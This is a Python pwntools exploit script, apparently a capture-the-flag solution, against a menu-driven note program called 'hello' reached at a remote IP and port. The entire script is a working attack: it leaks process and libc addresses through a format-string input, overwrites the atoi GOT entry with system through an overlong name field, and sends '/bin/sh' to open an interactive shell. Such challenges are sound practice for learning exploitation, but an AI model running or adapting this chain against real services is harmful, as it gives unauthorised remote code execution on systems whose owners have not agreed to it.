from pwn import *

# p = process('./hello')
p = remote("61.147.171.105",59712)
hello = ELF('./hello')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']


def newnote(number, name,size,des):
    p.recvuntil('your choice>>')
    p.sendline('1')
    p.recvuntil('phone number:')
    p.sendline(number)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('des info:')
    p.sendline(des)

def shownote(id):
    p.recvuntil('your choice>>')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(id))

def editnote(id,num,name,des):
    p.recvuntil('your choice>>')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(id))
    p.recvuntil('number:')
    p.sendline(num)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('des info:')
    p.sendline(des)

def deletenote(id):
    p.recvuntil('your choice>>')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(id))

# pause() debug
# leak process base libc base
newnote("%12$p%13$p","0",128, "0"*16)#0
shownote(0)

process__libc = p.recvuntil("name",drop=True)[-29:-1]
process_base = int(process__libc[:14].ljust(8,b'\x00'),16) - 0x12a0#__libc_csu_init
libc__libc_start_main_off = libc.symbols["__libc_start_main"]
libc_base = int(process__libc[14:].ljust(8,b'\x00'),16) - libc__libc_start_main_off - 240#__libc_start_main + 240
print('process_base:',hex(process_base))
print('libc_base:',hex(libc_base))

# get atoi_got
atoi_got = hello.got['atoi']+process_base
print('atoi_got:',hex(atoi_got))
# get system_addr
system_offest = libc.symbols['system']
system_addr = libc_base + system_offest

print('leak system addr: ', hex(system_addr))

# modify atoi_got -> system_addr
overwrite_name_payload = b"a"*13 + p64(atoi_got)

editnote(0, '0',overwrite_name_payload,p64(system_addr))

# get shell
p.recvuntil('your choice>>')
p.sendline('/bin/sh')
p.interactive()